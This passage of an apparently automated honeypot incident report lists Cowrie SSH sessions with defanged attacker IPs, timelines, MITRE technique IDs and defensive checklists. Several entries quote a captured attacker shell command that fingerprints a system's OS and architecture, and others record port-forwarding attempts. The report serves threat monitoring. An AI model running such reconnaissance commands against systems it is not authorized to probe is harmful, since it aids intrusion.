- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-464958e12eb8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 12:16 |
| **Last Seen** | 2026-08-23 12:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:16:23` | `cowrie.session.connect` |
| `2026-08-23 12:16:23` | `cowrie.client.version` |
| `2026-08-23 12:16:23` | `cowrie.client.kex` |
| `2026-08-23 12:16:26` | `cowrie.login.success` |
| `2026-08-23 12:16:28` | `cowrie.session.params` |
| `2026-08-23 12:16:28` | `cowrie.command.input` |
| `2026-08-23 12:16:28` | `cowrie.command.input` |
| `2026-08-23 12:16:28` | `cowrie.command.input` |
| `2026-08-23 12:16:28` | `cowrie.command.input` |
| `2026-08-23 12:16:28` | `cowrie.command.input` |
| `2026-08-23 12:16:28` | `cowrie.command.success` |
| `2026-08-23 12:16:28` | `cowrie.command.input` |
| `2026-08-23 12:16:28` | `cowrie.command.input` |
| `2026-08-23 12:16:28` | `cowrie.command.input` |
| `2026-08-23 12:16:28` | `cowrie.command.input` |
| `2026-08-23 12:16:29` | `cowrie.log.closed` |
| `2026-08-23 12:16:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6ad8d773d34

| Field | Detail |
|---|---|
| **Source IP** | `187.49.63[.]51` |
| **First Seen** | 2026-08-23 12:17 |
| **Last Seen** | 2026-08-23 12:17 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:17:42` | `cowrie.session.connect` |
| `2026-08-23 12:17:42` | `cowrie.client.version` |
| `2026-08-23 12:17:42` | `cowrie.client.kex` |
| `2026-08-23 12:17:44` | `cowrie.login.success` |
| `2026-08-23 12:17:45` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:17:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.49.63[.]51` to AbuseIPDB if not already reported
- [ ] Block `187.49.63[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58a3c6e6a45a

| Field | Detail |
|---|---|
| **Source IP** | `177.174.16[.]55` |
| **First Seen** | 2026-08-23 12:17 |
| **Last Seen** | 2026-08-23 12:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:17:50` | `cowrie.session.connect` |
| `2026-08-23 12:17:51` | `cowrie.client.version` |
| `2026-08-23 12:17:51` | `cowrie.client.kex` |
| `2026-08-23 12:17:53` | `cowrie.login.success` |
| `2026-08-23 12:17:54` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:17:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.174.16[.]55` to AbuseIPDB if not already reported
- [ ] Block `177.174.16[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23f5b2d7dd80

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 12:18 |
| **Last Seen** | 2026-08-23 12:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:18:46` | `cowrie.session.connect` |
| `2026-08-23 12:18:47` | `cowrie.client.version` |
| `2026-08-23 12:18:47` | `cowrie.client.kex` |
| `2026-08-23 12:18:49` | `cowrie.login.success` |
| `2026-08-23 12:18:51` | `cowrie.session.params` |
| `2026-08-23 12:18:51` | `cowrie.command.input` |
| `2026-08-23 12:18:51` | `cowrie.command.input` |
| `2026-08-23 12:18:51` | `cowrie.command.input` |
| `2026-08-23 12:18:51` | `cowrie.command.input` |
| `2026-08-23 12:18:51` | `cowrie.command.input` |
| `2026-08-23 12:18:51` | `cowrie.command.success` |
| `2026-08-23 12:18:51` | `cowrie.command.input` |
| `2026-08-23 12:18:51` | `cowrie.command.input` |
| `2026-08-23 12:18:51` | `cowrie.command.input` |
| `2026-08-23 12:18:51` | `cowrie.command.input` |
| `2026-08-23 12:18:51` | `cowrie.log.closed` |
| `2026-08-23 12:18:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b34584039fd0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 12:19 |
| **Last Seen** | 2026-08-23 12:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:19:38` | `cowrie.session.connect` |
| `2026-08-23 12:19:38` | `cowrie.client.version` |
| `2026-08-23 12:19:38` | `cowrie.client.kex` |
| `2026-08-23 12:19:39` | `cowrie.login.success` |
| `2026-08-23 12:19:39` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:19:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 12:19:40` | `cowrie.direct-tcpip.data` |
| `2026-08-23 12:19:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0816c6f2d1c0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 12:19 |
| **Last Seen** | 2026-08-23 12:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:19:42` | `cowrie.session.connect` |
| `2026-08-23 12:19:42` | `cowrie.client.version` |
| `2026-08-23 12:19:42` | `cowrie.client.kex` |
| `2026-08-23 12:19:43` | `cowrie.login.success` |
| `2026-08-23 12:19:43` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:19:44` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 12:19:44` | `cowrie.direct-tcpip.data` |
| `2026-08-23 12:19:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e6e32cf170c

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 12:21 |
| **Last Seen** | 2026-08-23 12:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:21:06` | `cowrie.session.connect` |
| `2026-08-23 12:21:07` | `cowrie.client.version` |
| `2026-08-23 12:21:07` | `cowrie.client.kex` |
| `2026-08-23 12:21:10` | `cowrie.login.success` |
| `2026-08-23 12:21:11` | `cowrie.session.params` |
| `2026-08-23 12:21:11` | `cowrie.command.input` |
| `2026-08-23 12:21:11` | `cowrie.command.input` |
| `2026-08-23 12:21:11` | `cowrie.command.input` |
| `2026-08-23 12:21:11` | `cowrie.command.input` |
| `2026-08-23 12:21:11` | `cowrie.command.input` |
| `2026-08-23 12:21:11` | `cowrie.command.success` |
| `2026-08-23 12:21:11` | `cowrie.command.input` |
| `2026-08-23 12:21:11` | `cowrie.command.input` |
| `2026-08-23 12:21:11` | `cowrie.command.input` |
| `2026-08-23 12:21:11` | `cowrie.command.input` |
| `2026-08-23 12:21:12` | `cowrie.log.closed` |
| `2026-08-23 12:21:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70a02a83fbb6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-23 12:22 |
| **Last Seen** | 2026-08-23 12:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:22:16` | `cowrie.session.connect` |
| `2026-08-23 12:22:16` | `cowrie.client.version` |
| `2026-08-23 12:22:16` | `cowrie.client.kex` |
| `2026-08-23 12:22:17` | `cowrie.login.success` |
| `2026-08-23 12:22:17` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:22:17` | `cowrie.direct-tcpip.data` |
| `2026-08-23 12:22:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61292aee3b0a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 12:23 |
| **Last Seen** | 2026-08-23 12:23 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:23:27` | `cowrie.session.connect` |
| `2026-08-23 12:23:28` | `cowrie.client.version` |
| `2026-08-23 12:23:28` | `cowrie.client.kex` |
| `2026-08-23 12:23:30` | `cowrie.login.success` |
| `2026-08-23 12:23:32` | `cowrie.session.params` |
| `2026-08-23 12:23:32` | `cowrie.command.input` |
| `2026-08-23 12:23:32` | `cowrie.command.input` |
| `2026-08-23 12:23:32` | `cowrie.command.input` |
| `2026-08-23 12:23:32` | `cowrie.command.input` |
| `2026-08-23 12:23:32` | `cowrie.command.input` |
| `2026-08-23 12:23:32` | `cowrie.command.success` |
| `2026-08-23 12:23:32` | `cowrie.command.input` |
| `2026-08-23 12:23:32` | `cowrie.command.input` |
| `2026-08-23 12:23:32` | `cowrie.command.input` |
| `2026-08-23 12:23:32` | `cowrie.command.input` |
| `2026-08-23 12:23:33` | `cowrie.log.closed` |
| `2026-08-23 12:23:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95302b5c6a96

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 12:28 |
| **Last Seen** | 2026-08-23 12:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:28:06` | `cowrie.session.connect` |
| `2026-08-23 12:28:06` | `cowrie.client.version` |
| `2026-08-23 12:28:06` | `cowrie.client.kex` |
| `2026-08-23 12:28:07` | `cowrie.login.success` |
| `2026-08-23 12:28:09` | `cowrie.session.params` |
| `2026-08-23 12:28:09` | `cowrie.command.input` |
| `2026-08-23 12:28:09` | `cowrie.command.input` |
| `2026-08-23 12:28:09` | `cowrie.command.input` |
| `2026-08-23 12:28:09` | `cowrie.command.input` |
| `2026-08-23 12:28:09` | `cowrie.command.input` |
| `2026-08-23 12:28:09` | `cowrie.command.success` |
| `2026-08-23 12:28:09` | `cowrie.command.input` |
| `2026-08-23 12:28:09` | `cowrie.command.input` |
| `2026-08-23 12:28:09` | `cowrie.command.input` |
| `2026-08-23 12:28:09` | `cowrie.command.input` |
| `2026-08-23 12:28:09` | `cowrie.log.closed` |
| `2026-08-23 12:28:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec28b140bfbf

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 12:29 |
| **Last Seen** | 2026-08-23 12:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:29:23` | `cowrie.session.connect` |
| `2026-08-23 12:29:23` | `cowrie.client.version` |
| `2026-08-23 12:29:23` | `cowrie.client.kex` |
| `2026-08-23 12:29:24` | `cowrie.login.success` |
| `2026-08-23 12:29:24` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:29:25` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 12:29:25` | `cowrie.direct-tcpip.data` |
| `2026-08-23 12:29:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17361abc2b23

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 12:29 |
| **Last Seen** | 2026-08-23 12:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:29:27` | `cowrie.session.connect` |
| `2026-08-23 12:29:27` | `cowrie.client.version` |
| `2026-08-23 12:29:27` | `cowrie.client.kex` |
| `2026-08-23 12:29:28` | `cowrie.login.success` |
| `2026-08-23 12:29:28` | `cowrie.direct-tcpip.request` |
| `2026-08-23 12:29:28` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 12:29:28` | `cowrie.direct-tcpip.data` |
| `2026-08-23 12:29:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60abfb5ae2f5

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 12:30 |
| **Last Seen** | 2026-08-23 12:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:30:27` | `cowrie.session.connect` |
| `2026-08-23 12:30:27` | `cowrie.client.version` |
| `2026-08-23 12:30:27` | `cowrie.client.kex` |
| `2026-08-23 12:30:29` | `cowrie.login.success` |
| `2026-08-23 12:30:30` | `cowrie.session.params` |
| `2026-08-23 12:30:30` | `cowrie.command.input` |
| `2026-08-23 12:30:30` | `cowrie.command.input` |
| `2026-08-23 12:30:30` | `cowrie.command.input` |
| `2026-08-23 12:30:30` | `cowrie.command.input` |
| `2026-08-23 12:30:30` | `cowrie.command.input` |
| `2026-08-23 12:30:30` | `cowrie.command.success` |
| `2026-08-23 12:30:30` | `cowrie.command.input` |
| `2026-08-23 12:30:30` | `cowrie.command.input` |
| `2026-08-23 12:30:30` | `cowrie.command.input` |
| `2026-08-23 12:30:30` | `cowrie.command.input` |
| `2026-08-23 12:30:30` | `cowrie.log.closed` |
| `2026-08-23 12:30:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89393f9f7d55

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 12:32 |
| **Last Seen** | 2026-08-23 12:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:32:53` | `cowrie.session.connect` |
| `2026-08-23 12:32:53` | `cowrie.client.version` |
| `2026-08-23 12:32:53` | `cowrie.client.kex` |
| `2026-08-23 12:32:54` | `cowrie.login.success` |
| `2026-08-23 12:32:56` | `cowrie.session.params` |
| `2026-08-23 12:32:56` | `cowrie.command.input` |
| `2026-08-23 12:32:56` | `cowrie.command.input` |
| `2026-08-23 12:32:56` | `cowrie.command.input` |
| `2026-08-23 12:32:56` | `cowrie.command.input` |
| `2026-08-23 12:32:56` | `cowrie.command.input` |
| `2026-08-23 12:32:56` | `cowrie.command.success` |
| `2026-08-23 12:32:56` | `cowrie.command.input` |
| `2026-08-23 12:32:56` | `cowrie.command.input` |
| `2026-08-23 12:32:56` | `cowrie.command.input` |
| `2026-08-23 12:32:56` | `cowrie.command.input` |
| `2026-08-23 12:32:57` | `cowrie.log.closed` |
| `2026-08-23 12:32:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbd3448e8127

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-23 12:35 |
| **Last Seen** | 2026-08-23 12:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:35:32` | `cowrie.session.connect` |
| `2026-08-23 12:35:32` | `cowrie.client.version` |
| `2026-08-23 12:35:32` | `cowrie.client.kex` |
| `2026-08-23 12:35:33` | `cowrie.login.success` |
| `2026-08-23 12:35:34` | `cowrie.session.params` |
| `2026-08-23 12:35:34` | `cowrie.command.input` |
| `2026-08-23 12:35:34` | `cowrie.command.input` |
| `2026-08-23 12:35:34` | `cowrie.command.input` |
| `2026-08-23 12:35:34` | `cowrie.command.input` |
| `2026-08-23 12:35:34` | `cowrie.command.input` |
| `2026-08-23 12:35:34` | `cowrie.command.success` |
| `2026-08-23 12:35:34` | `cowrie.command.input` |
| `2026-08-23 12:35:34` | `cowrie.command.input` |
| `2026-08-23 12:35:34` | `cowrie.command.input` |
| `2026-08-23 12:35:34` | `cowrie.command.input` |
| `2026-08-23 12:35:34` | `cowrie.log.closed` |
| `2026-08-23 12:35:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9368484ca42

| Field | Detail |
|---|---|
| **Source IP** | `185.64.25[.]226` |
| **First Seen** | 2026-08-23 12:36 |
| **Last Seen** | 2026-08-23 12:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
